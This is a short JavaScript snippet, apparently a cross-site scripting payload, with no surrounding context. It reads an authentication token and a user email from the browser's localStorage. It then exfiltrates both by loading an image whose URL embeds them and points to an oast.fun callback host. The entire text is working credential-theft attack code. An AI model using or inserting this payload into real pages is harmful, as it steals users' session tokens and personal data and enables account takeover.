    token=localStorage.getItem('__aple_auth__')
    email=localStorage.getItem('__aple_user__')
    var imgElement = document.createElement('img');
    imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/'+token+"/user_data?data="+email;
    imgElement.alt = 'Generated image';
    document.body.appendChild(imgElement);
